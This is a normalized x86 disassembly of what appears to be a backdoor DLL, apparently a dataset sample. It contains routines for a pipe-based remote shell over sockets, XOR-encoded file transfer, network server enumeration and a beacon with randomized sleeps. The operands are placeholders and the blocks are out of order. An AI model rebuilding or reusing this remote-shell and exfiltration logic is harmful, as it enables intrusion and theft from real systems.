push ebp
push esi
mov ebp 0x2000
push ebp
xor ebx ebx
lea eax [ esp + 0x18 ]
push ebx
push eax
call memset
add esp 0xc
push ebx
push ebx
lea eax [ esp + 0x14 ]
push eax
push 0x1fec
lea eax [ esp + 0x24 ]
push eax
push [ rw-data ]
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
push [ rw-data ]
mov esi [ CloseHandle@IAT ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push ebx
call [ ExitThread@IAT ]
pop esi
pop ebp
pop ebx
push edi
mov esi rw-data
mov edi rw-data
push 0x5
call [ Sleep@IAT ]
push [ esp + 0x14 ]
lea eax [ esp + 0x201c ]
push eax
push [ rw-data ]
mov [ rw-data ] bl
call sub_7100296b
cmp eax 0x1
jl r-xdata
push 0x32
call [ Sleep@IAT ]
push ebx
lea eax [ esp + 0x14 ]
push eax
push 0x1fec
lea eax [ esp + 0x24 ]
push eax
push [ rw-data ]
call [ ReadFile@IAT ]
push ebp
push ebx
push esi
call memset
push [ esp + 0x1c ]
lea eax [ esp + 0x28 ]
push eax
push esi
call memcpy
add esp 0x18
push [ esp + 0x10 ]
push edi
push esi
call sub_71003453
push ebp
mov [ rw-data ] eax
lea eax [ esp + 0x201c ]
push ebx
push eax
call memset
push [ rw-data ]
lea eax [ esp + 0x2028 ]
push edi
push eax
call memcpy
mov eax [ rw-data ]
push ebp
push ebx
push esi
mov [ esp + 0x38 ] eax
call memset
push [ rw-data ]
push r--data
push esi
call [ sprintf@IAT ]
push esi
call strlen
add esp 0x34
push eax
push edi
push esi
call sub_71003453
push ebx
push eax
push edi
push [ rw-data ]
mov [ rw-data ] eax
call send
cmp eax 0x1
jge r-xdata
push ebx
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
jmp r-xdata
cmp [ esp + 0x10 ] ebx
jbe r-xdata
jmp r-xdata
cmp [ rw-data ] bl
je r-xdata
push ebx
push ebx
lea eax [ esp + 0x18 ]
push eax
push 0x1fec
lea eax [ esp + 0x28 ]
push eax
push [ rw-data ]
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
pop edi
sub_7100367f
mov eax 0x2244
call sub_710059c0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2240 ] eax
push ebx
push ebp
push esi
mov esi [ esp + 0x2254 ]
push edi
xor ebx ebx
push 0x64
mov [ esp + 0x2c ] 0x12c
mov [ esp + 0x30 ] ebx
mov [ esp + 0x1b ] bl
call [ malloc@IAT ]
push 0x64
mov edi eax
push ebx
push edi
mov [ esp + 0x30 ] edi
call memset
push 0x6
push r--data
push esi
call memcmp
add esp 0x1c
test eax eax
push esi
jne r-xdata
call strlen
sub eax 0x9
add esi 0x9
mov [ esp + 0x1b ] 0x1
call strlen
sub eax 0x7
add esi 0x7
jmp r-xdata
push rw-data
call [ atol@IAT ]
pop ecx
push eax
call htons
push rw-data
mov [ esp + 0x246 ] ax
mov [ esp + 0x244 ] 0x2
call inet_addr
mov [ esp + 0x244 ] eax
push 0x10
lea eax [ esp + 0x244 ]
push eax
push ebp
call connect
mov edi 0x2000
push edi
push ebx
mov esi rw-data
push esi
mov [ esp + 0x1c ] eax
call memset
push edi
push ebx
mov edi rw-data
push edi
call memset
add esp 0x18
cmp [ esp + 0x10 ] ebx
je r-xdata
push ebx
call [ ExitThread@IAT ]
push eax
push esi
push edi
call [ strncpy@IAT ]
add esp 0x10
push ebx
push 0x1
push 0x2
call socket
mov ebp eax
cmp ebp 0xffffffff
jne r-xdata
push r--data
push esi
call strcpy
push esi
call strlen
add esp 0xc
push eax
push edi
push esi
call sub_71003453
push eax
push edi
push ebp
mov [ rw-data ] eax
call sub_7100296b
cmp eax 0x1
jge r-xdata
push r--data
push esi
call strcpy
push esi
call strlen
add esp 0xc
push eax
push edi
push esi
call sub_71003453
push eax
push edi
push [ rw-data ]
mov [ rw-data ] eax
call sub_7100296b
cmp eax 0x1
jge r-xdata
push 0x2000
push ebx
push esi
call memset
push 0x2000
push ebx
push edi
call memset
add esp 0x18
cmp [ esp + 0x17 ] 0x1
jne r-xdata
push ebx
push ebp
call shutdown
push [ esp + 0x20 ]
push ebx
push [ rw-data ]
call shutdown
push [ rw-data ]
cmp [ esp + 0x17 ] bl
jne r-xdata
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
push [ esp + 0x38 ]
call [ CreateFileA@IAT ]
cmp eax ebx
mov [ esp + 0x10 ] eax
je r-xdata
call closesocket
push ebp
call closesocket
push [ esp + 0x20 ]
jmp r-xdata
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0x80000000
push [ esp + 0x38 ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x10 ] eax
je r-xdata
push r--data
push esi
call strcpy
push esi
call strlen
add esp 0xc
push eax
push edi
push esi
call sub_71003453
push eax
push edi
push [ rw-data ]
mov [ rw-data ] eax
call sub_7100296b
cmp eax 0x1
jge r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
jg r-xdata
call [ free@IAT ]
pop ecx
jmp r-xdata
push r--data
push esi
call strcpy
push esi
call strlen
add esp 0xc
jmp r-xdata
lea ecx [ esp + 0x34 ]
push ecx
push eax
call [ GetFileSize@IAT ]
mov ecx [ rw-data ]
cmp ecx ebx
mov [ esp + 0x30 ] eax
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x34 ]
mov [ esp + 0x1c ] eax
jg r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
push ebx
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
jmp r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
jl r-xdata
push eax
push edi
push esi
call sub_71003453
push eax
push edi
push [ rw-data ]
mov [ rw-data ] eax
call sub_7100296b
cmp eax 0x1
jge r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
jl r-xdata
mov ecx [ esp + 0x2250 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_71005920
add esp 0x2244
retn 0x4
lea eax [ esp + 0x28 ]
push eax
push ebx
push ebx
lea eax [ esp + 0x44 ]
push eax
push ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x50 ] ebp
mov [ esp + 0x4c ] 0x1
call select
cmp eax 0xffffffff
je r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
jmp r-xdata
and eax ecx
cmp eax 0xffffffff
je r-xdata
cmp eax ebx
ja r-xdata
or [ rw-data ] 0xffffffff
mov [ rw-data ] 0xfffffffe
push ebx
push [ rw-data ]
call shutdown
push [ rw-data ]
jmp r-xdata
push 0x64
call [ Sleep@IAT ]
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push r--data
push esi
call [ sprintf@IAT ]
push esi
call strlen
add esp 0x14
push eax
push edi
push esi
call sub_71003453
push eax
push edi
push [ rw-data ]
mov [ rw-data ] eax
call sub_7100296b
cmp eax 0x1
jge r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
push ebx
push ebp
call shutdown
push ebp
mov edx eax
or edx ecx
je r-xdata
cmp eax ebx
ja r-xdata
push 0xc8
call [ Sleep@IAT ]
jmp r-xdata
cmp eax ebx
je r-xdata
push ebp
jmp r-xdata
push 0xc8
call [ Sleep@IAT ]
mov ecx [ rw-data ]
cmp ecx ebx
jl r-xdata
and eax ecx
cmp eax 0xffffffff
jne r-xdata
jmp r-xdata
call closesocket
mov eax [ esp + 0x18 ]
or eax [ esp + 0x1c ]
je r-xdata
push ebx
push [ rw-data ]
call shutdown
push [ rw-data ]
sub [ esp + 0x18 ] eax
sbb [ esp + 0x1c ] ecx
and eax ecx
cmp eax 0xffffffff
jne r-xdata
and eax ecx
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
lea eax [ esp + 0x38 ]
push eax
push ebp
call __WSAFDIsSet
test eax eax
je r-xdata
mov eax [ rw-data ]
jg r-xdata
push 0x3e8
call [ Sleep@IAT ]
push ebx
push [ rw-data ]
push [ rw-data ]
push [ esp + 0x1c ]
call sub_71002ada
or [ rw-data ] 0xffffffff
mov [ rw-data ] 0xfffffffe
jmp r-xdata
push 0x32
call [ Sleep@IAT ]
mov ecx [ rw-data ]
cmp ecx ebx
jl r-xdata
mov eax [ esp + 0x18 ]
add eax [ esp + 0x24 ]
adc [ esp + 0x1c ] ebx
cmp eax [ rw-data ]
mov [ esp + 0x18 ] eax
jne r-xdata
push ebx
push 0x2000
lea eax [ esp + 0x258 ]
push eax
push ebp
call recv
cmp eax ebx
mov [ esp + 0x20 ] eax
push ebx
jle r-xdata
mov eax [ rw-data ]
cmp eax ebx
jbe r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
jg r-xdata
cmp [ esp + 0x20 ] ebx
jg r-xdata
mov eax [ esp + 0x1c ]
cmp eax [ rw-data ]
je r-xdata
push ebp
call shutdown
push ebp
call closesocket
jmp r-xdata
lea ecx [ esp + 0x28 ]
push ecx
push eax
lea eax [ esp + 0x25c ]
push eax
push [ esp + 0x20 ]
call [ WriteFile@IAT ]
jmp r-xdata
cmp [ esp + 0x24 ] ebx
jne r-xdata
lea eax [ esp + 0x13c ]
push eax
push ebp
call __WSAFDIsSet
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
jbe r-xdata
push r--data
push esi
call strcpy
push esi
call strlen
add esp 0xc
push eax
push edi
push esi
call sub_71003453
push eax
push edi
push [ rw-data ]
mov [ rw-data ] eax
call sub_7100296b
cmp eax 0x1
jge r-xdata
lea eax [ esp + 0x28 ]
push eax
push ebx
lea eax [ esp + 0x144 ]
push eax
push ebx
push ebx
mov [ esp + 0x154 ] ebp
mov [ esp + 0x150 ] 0x1
call select
cmp eax 0xffffffff
je r-xdata
push [ esp + 0x10 ]
call [ CloseHandle@IAT ]
jmp r-xdata
push ebx
lea eax [ esp + 0x28 ]
push eax
push 0x2000
lea eax [ esp + 0x25c ]
push eax
push [ esp + 0x20 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
push ebx
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
cmp [ rw-data ] bl
je r-xdata
cmp [ rw-data ] bl
push ebx
jne r-xdata
push 0x64
call [ Sleep@IAT ]
push ebp
call closesocket
push 0x2000
push ebx
push esi
mov [ rw-data ] bl
call memset
push 0x2000
push ebx
push edi
call memset
push r--data
push esi
call strcpy
push esi
call strlen
add esp 0x24
mov [ rw-data ] bl
push [ esp + 0x28 ]
lea eax [ esp + 0x258 ]
push eax
push ebp
call send
test eax eax
jl r-xdata
call closesocket
push ebx
jmp r-xdata
push ebp
call shutdown
push ebp
jmp r-xdata
sub_71003d27
push ebp
lea ebp [ esp - 0x1fa0 ]
mov eax 0x2020
call sub_710059c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1f9c ] eax
push ebx
push esi
mov esi [ malloc@IAT ]
push edi
mov edi [ ebp + 0x1fa8 ]
push 0x64
pop ebx
push ebx
call esi
push ebx
mov [ ebp - 0x78 ] eax
call esi
push ebx
mov [ ebp - 0x74 ] eax
call esi
push ebx
xor ebx ebx
push ebx
push [ ebp - 0x78 ]
mov esi eax
mov [ ebp - 0x7c ] esi
call memset
push 0x64
push ebx
push [ ebp - 0x74 ]
call memset
push 0x64
push ebx
push esi
call memset
push edi
call strlen
push eax
add edi 0x3
push edi
push esi
call [ strncpy@IAT ]
add esp 0x40
push esi
mov [ ebp - 0x68 ] ebx
call strlen
test eax eax
pop ecx
jle r-xdata
mov edi [ ebp - 0x68 ]
push esi
inc edi
call strlen
cmp edi eax
pop ecx
jge r-xdata
mov eax [ ebp - 0x78 ]
sub eax esi
mov edi esi
mov [ ebp - 0x70 ] eax
jmp r-xdata
call sub_71001ac7
mov edi [ CreateFileA@IAT ]
push ebx
mov esi 0x80
push esi
push 0x3
push ebx
push ebx
push 0x80000000
push [ ebp - 0x78 ]
call edi
cmp eax 0xffffffff
mov [ ebp - 0x70 ] eax
je r-xdata
mov ecx [ ebp - 0x74 ]
mov eax edi
sub eax [ ebp - 0x68 ]
lea eax [ eax + ecx - 0x1 ]
jmp r-xdata
mov cl [ edi ]
cmp cl 0x2d
je r-xdata
mov edi 0x2000
push ebx
push esi
push 0x2
push ebx
push ebx
push 0x40000000
push [ ebp - 0x74 ]
call edi
mov [ ebp - 0x68 ] eax
push ebx
lea eax [ ebp - 0x80 ]
push eax
mov edi rw-data
push edi
call strlen
pop ecx
push eax
push edi
push [ ebp - 0x68 ]
call [ WriteFile@IAT ]
mov cl [ edi + esi ]
mov [ eax ] cl
inc edi
inc eax
push esi
mov [ ebp - 0x70 ] eax
call strlen
cmp edi eax
pop ecx
jl r-xdata
inc [ ebp - 0x68 ]
mov [ eax + edi ] cl
push esi
inc edi
call strlen
cmp [ ebp - 0x68 ] eax
pop ecx
jl r-xdata
cmp [ ebp - 0x6c ] ebx
jne r-xdata
cmp [ ebp - 0x6c ] ebx
jbe r-xdata
mov eax [ ebp - 0x70 ]
mov eax [ ebp - 0x70 ]
push edi
lea eax [ ebp - 0x64 ]
push ebx
push eax
call memset
add esp 0xc
push ebx
lea eax [ ebp - 0x6c ]
push eax
push edi
lea eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x70 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x70 ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0x68 ]
call esi
push [ ebp - 0x78 ]
mov esi [ free@IAT ]
call esi
push [ ebp - 0x74 ]
call esi
push [ ebp - 0x7c ]
call esi
push edi
push ebx
mov esi rw-data
push esi
call memset
push edi
push ebx
mov edi rw-data
push edi
call memset
push r--data
push esi
call strcpy
push esi
call strlen
add esp 0x30
push eax
push edi
push esi
call sub_71003453
push ebx
push eax
push edi
push [ rw-data ]
mov [ rw-data ] eax
call send
push ebx
call [ ExitThread@IAT ]
push [ ebp - 0x6c ]
call sub_71001d4d
xor eax eax
cmp [ ebp - 0x6c ] ebx
jle r-xdata
push ebx
lea eax [ ebp - 0x80 ]
push eax
push [ ebp - 0x6c ]
lea eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x68 ]
call [ WriteFile@IAT ]
mov cl [ eax + rw-data ]
xor [ ebp + eax - 0x64 ] cl
inc eax
cmp eax [ ebp - 0x6c ]
jl r-xdata
sub_71003f42
push ebp
lea ebp [ esp - 0x1fa8 ]
mov eax 0x2028
call sub_710059c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1fa4 ] eax
push ebx
push esi
mov esi [ malloc@IAT ]
push edi
mov edi [ ebp + 0x1fb0 ]
push 0x64
pop ebx
push ebx
call esi
push ebx
mov [ ebp - 0x74 ] eax
call esi
push ebx
mov [ ebp - 0x70 ] eax
call esi
push ebx
xor ebx ebx
push ebx
push [ ebp - 0x74 ]
mov esi eax
mov [ ebp - 0x7c ] esi
call memset
push 0x64
push ebx
push [ ebp - 0x70 ]
call memset
push 0x64
push ebx
push esi
call memset
push edi
call strlen
push eax
add edi 0x3
push edi
push esi
call [ strncpy@IAT ]
add esp 0x40
push esi
mov [ ebp - 0x64 ] ebx
call strlen
test eax eax
pop ecx
jle r-xdata
mov edi [ ebp - 0x64 ]
push esi
inc edi
call strlen
cmp edi eax
pop ecx
jge r-xdata
mov eax [ ebp - 0x74 ]
sub eax esi
mov edi esi
mov [ ebp - 0x6c ] eax
jmp r-xdata
mov edi 0x2000
push edi
push ebx
mov esi rw-data
push esi
call memset
push edi
push ebx
mov edi rw-data
push edi
call memset
add esp 0x18
push ebx
push 0x80
push 0x3
push ebx
push ebx
push 0x80000000
push [ ebp - 0x74 ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x64 ] eax
jne r-xdata
mov ecx [ ebp - 0x70 ]
mov eax edi
sub eax [ ebp - 0x64 ]
lea eax [ eax + ecx - 0x1 ]
jmp r-xdata
mov cl [ edi ]
cmp cl 0x2d
je r-xdata
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
push [ ebp - 0x70 ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x6c ] eax
jne r-xdata
push r--data
push esi
call strcpy
push esi
call strlen
add esp 0xc
push eax
push edi
push esi
call sub_71003453
push ebx
push eax
push edi
push [ rw-data ]
mov [ rw-data ] eax
call send
cmp eax 0x1
jge r-xdata
mov cl [ edi + esi ]
mov [ eax ] cl
inc edi
inc eax
push esi
mov [ ebp - 0x6c ] eax
call strlen
cmp edi eax
pop ecx
jl r-xdata
inc [ ebp - 0x64 ]
mov [ eax + edi ] cl
push esi
inc edi
call strlen
cmp [ ebp - 0x64 ] eax
pop ecx
jl r-xdata
push 0xc8
push ebx
push rw-data
call memset
add esp 0xc
push ebx
lea eax [ ebp - 0x68 ]
push eax
push 0x1
lea eax [ ebp - 0x5d ]
push eax
push [ ebp - 0x64 ]
call [ ReadFile@IAT ]
not [ ebp - 0x5d ]
cmp [ ebp - 0x5d ] 0x23
je r-xdata
push r--data
push esi
call strcpy
push esi
call strlen
add esp 0xc
push eax
push edi
push esi
call sub_71003453
push ebx
push eax
push edi
push [ rw-data ]
mov [ rw-data ] eax
call send
cmp eax 0x1
jl r-xdata
mov ecx [ ebp + 0x1fa4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_71005920
add ebp 0x1fa8
leave
retn 0x4
push [ rw-data ]
call closesocket
mov eax [ ebp - 0x6c ]
mov eax [ ebp - 0x6c ]
push rw-data
call [ atoi@IAT ]
pop ecx
push 0x64
pop ecx
mov [ ebp - 0x78 ] rw-data
mov edx eax
shr edx 0x6
xor edx eax
shr edx 0x18
and edx 0x1
add eax eax
or eax edx
dec ecx
jne r-xdata
push 0x64
mov [ rw-data ] eax
pop ecx
mov al [ ebp - 0x5d ]
mov ecx [ ebp - 0x78 ]
inc [ ebp - 0x78 ]
push ebx
mov [ ecx ] al
lea eax [ ebp - 0x68 ]
push eax
push 0x1
lea eax [ ebp - 0x5d ]
push eax
push [ ebp - 0x64 ]
call [ ReadFile@IAT ]
not [ ebp - 0x5d ]
cmp [ ebp - 0x5d ] 0x23
jne r-xdata
mov edx eax
shr edx 0xd
xor edx eax
shr edx 0x11
and edx 0x1
add eax eax
or eax edx
dec ecx
jne r-xdata
mov [ rw-data ] eax
cmp [ ebp - 0x68 ] ebx
jne r-xdata
cmp [ ebp - 0x68 ] ebx
jbe r-xdata
push 0x2000
lea eax [ ebp - 0x5c ]
push ebx
push eax
call memset
add esp 0xc
push ebx
lea eax [ ebp - 0x68 ]
push eax
push 0x2000
lea eax [ ebp - 0x5c ]
push eax
push [ ebp - 0x64 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x64 ]
call [ CloseHandle@IAT ]
push [ ebp - 0x6c ]
call [ CloseHandle@IAT ]
push 0x2000
push ebx
push esi
call memset
push 0x2000
push ebx
push edi
call memset
push r--data
push esi
call strcpy
push esi
call strlen
add esp 0x24
push eax
push edi
push esi
call sub_71003453
push ebx
push eax
push edi
push [ rw-data ]
mov [ rw-data ] eax
call send
cmp eax 0x1
jl r-xdata
push [ ebp - 0x68 ]
call sub_71001d4d
xor eax eax
cmp [ ebp - 0x68 ] ebx
jle r-xdata
push [ ebp - 0x74 ]
mov esi [ free@IAT ]
call esi
push [ ebp - 0x70 ]
call esi
push [ ebp - 0x7c ]
call esi
add esp 0xc
push ebx
call [ ExitThread@IAT ]
push ebx
lea eax [ ebp - 0x80 ]
push eax
push [ ebp - 0x68 ]
lea eax [ ebp - 0x5c ]
push eax
push [ ebp - 0x6c ]
call [ WriteFile@IAT ]
mov cl [ eax + rw-data ]
xor [ ebp + eax - 0x5c ] cl
inc eax
cmp eax [ ebp - 0x68 ]
jl r-xdata
sub_710042a7
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
mov esi [ malloc@IAT ]
push edi
xor ebx ebx
push 0x64
pop edi
push edi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x24 ] ebx
call esi
push edi
mov [ ebp - 0xc ] eax
call esi
push edi
mov [ ebp - 0x10 ] eax
call esi
push edi
push ebx
push [ ebp - 0xc ]
mov [ ebp - 0x1c ] eax
call memset
push edi
push ebx
push [ ebp - 0x10 ]
call memset
push edi
push ebx
push [ ebp - 0x1c ]
call memset
mov esi [ ebp + 0x8 ]
push esi
call strlen
push eax
add esi 0x6
push esi
mov esi [ ebp - 0x1c ]
push esi
call [ strncpy@IAT ]
add esp 0x40
push esi
call strlen
test eax eax
pop ecx
jbe r-xdata
push esi
lea edi [ ebx + 0x1 ]
call strlen
cmp edi eax
pop ecx
jae r-xdata
mov eax [ ebp - 0x10 ]
sub eax esi
mov edi esi
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov esi [ ebp - 0x10 ]
push 0x2
pop edi
push edi
push r--data
push esi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax edi
sub eax ebx
lea ebx [ eax + ecx - 0x1 ]
mov cl [ edi ]
cmp cl 0x2d
je r-xdata
push 0x3
push r--data
push esi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x18
mov al [ edi + esi ]
mov [ ebx ] al
inc edi
push esi
inc ebx
call strlen
cmp edi eax
pop ecx
jb r-xdata
mov [ eax + edi ] cl
inc ebx
push esi
inc edi
call strlen
cmp ebx eax
pop ecx
jb r-xdata
push 0x4
push r--data
push esi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp + 0x8 ]
push 0x3
push r--data
push esi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x2000000
push r--data
push [ ebp - 0xc ]
call [ fopen@IAT ]
pop ecx
pop ecx
mov ebx eax
lea eax [ ebp - 0x24 ]
push eax
xor esi esi
push esi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0xffffffff
lea eax [ ebp - 0x8 ]
push eax
push 0x65
push esi
call NetServerEnum
cmp eax esi
mov [ ebp - 0x4 ] eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov eax [ ebp - 0x8 ]
cmp eax esi
je r-xdata
cmp eax 0xea
je r-xdata
push ebx
call [ fclose@IAT ]
push [ ebp - 0xc ]
mov esi [ free@IAT ]
call esi
push [ ebp - 0x10 ]
call esi
push [ ebp - 0x1c ]
call esi
mov edi 0x2000
push edi
xor ebx ebx
push ebx
mov esi rw-data
push esi
call memset
push edi
push ebx
mov edi rw-data
push edi
call memset
push r--data
push esi
call strcpy
push esi
call strlen
add esp 0x34
push eax
push edi
push esi
call sub_71003453
push ebx
push eax
push edi
push [ rw-data ]
mov [ rw-data ] eax
call send
push ebx
call [ ExitThread@IAT ]
cmp [ ebp - 0x14 ] esi
mov [ ebp + 0x8 ] esi
mov esi [ fprintf@IAT ]
jbe r-xdata
push eax
push r--data
push ebx
call [ fprintf@IAT ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x4 ] 0xea
jne r-xdata
lea edi [ eax + 0x10 ]
cmp [ ebp - 0x8 ] esi
je r-xdata
push [ ebp - 0x18 ]
push r--data
push ebx
call esi
add esp 0xc
xor esi esi
push r--data
push ebx
call esi
push [ ebp - 0x20 ]
push r--data
push ebx
call esi
add esp 0x14
push r--data
push ebx
call [ fwprintf@IAT ]
pop ecx
pop ecx
push r--data
push ebx
call esi
push [ edi - 0xc ]
push r--data
push ebx
call [ fwprintf@IAT ]
push [ edi - 0x4 ]
push [ edi - 0x8 ]
push [ edi - 0x10 ]
push r--data
push ebx
call esi
push r--data
push ebx
call esi
add esp 0x30
test [ edi ] 0x8
je r-xdata
push [ ebp - 0x8 ]
call NetApiBufferFree
test [ edi ] 0x10
je r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
test [ edi ] 0x4
je r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
test [ edi ] 0x2000000
je r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
test [ edi ] 0x80
je r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
test [ edi ] 0x4000
je r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
test [ edi ] 0x200
je r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
push [ edi + 0x4 ]
push r--data
push ebx
call [ fwprintf@IAT ]
add esp 0xc
add edi 0x18
inc [ ebp - 0x18 ]
inc [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp eax [ ebp - 0x14 ]
jb r-xdata
push r--data
push ebx
call esi
pop ecx
pop ecx
lea eax [ edi - 0x10 ]
test eax eax
je r-xdata
jmp r-xdata
sub_710045eb
push 0xffffffff
push sub_7100649c
mov eax [ fs : 0x0 ]
push eax
mov eax 0x2654
call sub_710059c0
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2650 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x2668 ]
mov [ fs : 0x0 ] eax
mov edi [ fopen@IAT ]
mov ebp r--data
xor ebx ebx
push ebp
push r--data
mov [ esp + 0x3c ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebx
call edi
mov esi eax
cmp esi ebx
pop ecx
pop ecx
je r-xdata
push ebp
push r--data
call edi
mov esi eax
cmp esi ebx
pop ecx
pop ecx
je r-xdata
push esi
call [ fgetc@IAT ]
push 0x14
mov [ esp + 0x37 ] al
lea eax [ esp + 0x3c4 ]
push ebx
push eax
call memset
movsx eax [ esp + 0x3f ]
push eax
lea eax [ esp + 0x3d0 ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x1c
lea eax [ esp + 0x28 ]
push eax
push ebx
lea eax [ esp + 0x3c4 ]
push eax
push sub_71002b8c
push ebx
push ebx
call [ CreateThread@IAT ]
push esi
call [ fclose@IAT ]
pop ecx
mov [ esp + 0x74 ] 0x5
mov [ esp + 0x78 ] 0x1f4
mov [ esp + 0x70 ] 0x1
mov [ esp + 0x6c ] ebx
mov [ esp + 0x68 ] 0xc
mov esi rw-data
mov ebp rw-data
mov edi rw-data
push 0x14
lea eax [ esp + 0x3d4 ]
push ebx
push eax
call memset
push 0x14
lea eax [ esp + 0x3cc ]
push ebx
push eax
call memset
push esi
lea eax [ esp + 0x3d8 ]
push 0x14
push eax
call [ fgets@IAT ]
lea eax [ esp + 0x3e0 ]
push eax
lea eax [ esp + 0x3f8 ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x30
lea eax [ esp + 0x28 ]
push eax
push ebx
lea eax [ esp + 0x3d8 ]
push eax
push sub_710027f5
push ebx
push ebx
call [ CreateThread@IAT ]
push esi
call [ fclose@IAT ]
pop ecx
call sub_71002014
cmp eax ebx
mov [ esp + 0x40 ] eax
je r-xdata
push 0x1b7740
call [ Sleep@IAT ]
jmp r-xdata
mov ecx [ esp + 0x2668 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x2650 ]
xor ecx esp
call sub_71005920
add esp 0x2660
retn
cmp eax 0x1
jne r-xdata
lea eax [ esp + 0x218 ]
push eax
push 0x101
call WSAStartup
cmp eax ebx
je r-xdata
push ebx
push ebx
call [ InternetGetConnectedState@IAT ]
test eax eax
jne r-xdata
call sub_71001000
mov [ esp + 0x64 ] r--data
call sub_71002306
push 0x927c0
jmp r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call inet_ntoa
push 0x32
push ebx
push rw-data
mov [ esp + 0x30 ] eax
call memset
push [ esp + 0x30 ]
push rw-data
call strcpy
add esp 0x14
push ebx
push 0x1
push 0x2
call socket
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
push rw-data
call gethostbyname
cmp eax ebx
jne r-xdata
call [ Sleep@IAT ]
call WSACleanup
jmp r-xdata
push rw-data
call [ atol@IAT ]
pop ecx
push eax
call htons
push rw-data
mov [ esp + 0x20e ] ax
mov [ esp + 0x20c ] 0x2
call inet_addr
mov [ esp + 0x20c ] eax
push 0x10
lea eax [ esp + 0x20c ]
push eax
push [ rw-data ]
call connect
cmp eax ebx
je r-xdata
jmp r-xdata
push 0x124f80
push 0x2000
push ebx
push esi
call memset
push 0x2000
push ebx
push ebp
call memset
push r--data
push esi
call strcat
add esp 0x20
push 0x80
lea eax [ esp + 0x3e8 ]
push eax
call gethostname
test eax eax
jne r-xdata
push ebx
call [ _time64@IAT ]
push eax
call [ srand@IAT ]
pop ecx
pop ecx
call [ rand@IAT ]
push 0x28
cdq
pop ecx
idiv ecx
imul edx edx 0xea60
push edx
call [ Sleep@IAT ]
push rw-data
call gethostbyname
cmp eax ebx
je r-xdata
push rw-data
call gethostbyname
cmp eax ebx
jne r-xdata
push esi
call strlen
pop ecx
push eax
push ebp
push esi
call sub_71003453
push eax
push ebp
push [ rw-data ]
mov [ rw-data ] eax
call sub_7100296b
cmp eax 0x1
jl r-xdata
lea eax [ esp + 0x3e4 ]
push eax
push esi
call strcat
push r--data
push esi
call strcat
add esp 0x10
lea eax [ esp + 0x3e4 ]
push eax
call gethostbyname
cmp eax ebx
mov [ esp + 0x30 ] eax
je r-xdata
push ebx
push [ rw-data ]
call shutdown
